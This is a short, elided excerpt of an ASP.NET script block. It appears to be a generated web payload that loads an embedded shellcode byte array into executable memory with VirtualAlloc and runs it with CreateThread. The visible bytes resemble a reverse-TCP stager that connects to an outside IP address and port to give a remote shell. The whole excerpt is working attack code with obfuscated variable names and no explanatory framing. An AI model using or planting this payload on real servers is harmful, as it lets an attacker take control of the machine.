...
<script runat="server">
    ...
    {
        byte[] xDSAUIhsBg = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,
...
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x12,0x8b,0x09,0xd6,
0x68,0x02,0x00,0x35,0x50,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xd5};
        ...
        IntPtr g9aYFM1ae = VirtualAlloc(IntPtr.Zero,(UIntPtr)xDSAUIhsBg.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(xDSAUIhsBg,0,g9aYFM1ae,xDSAUIhsBg.Length);
        IntPtr fUhoqvg = IntPtr.Zero;
        IntPtr tAkB = CreateThread(IntPtr.Zero,UIntPtr.Zero,g9aYFM1ae,IntPtr.Zero,0,ref fUhoqvg);
    }
</script>
